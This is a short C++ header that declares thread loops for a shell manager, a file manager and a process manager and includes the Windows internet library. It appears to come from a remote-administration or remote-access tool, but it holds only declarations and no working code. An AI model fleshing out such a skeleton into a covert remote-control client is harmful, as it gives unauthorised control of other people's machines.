#pragma once
#include "KernelManager.h"
#include "FileManager.h"
#include "CmdManager.h"
#include "ProcessManager.h"
#include <wininet.h>


UINT WINAPI Loop_ShellManager(void* ID);


UINT WINAPI Loop_FileManager(void* ID);


UINT WINAPI Loop_ProcessManager(void* ID);
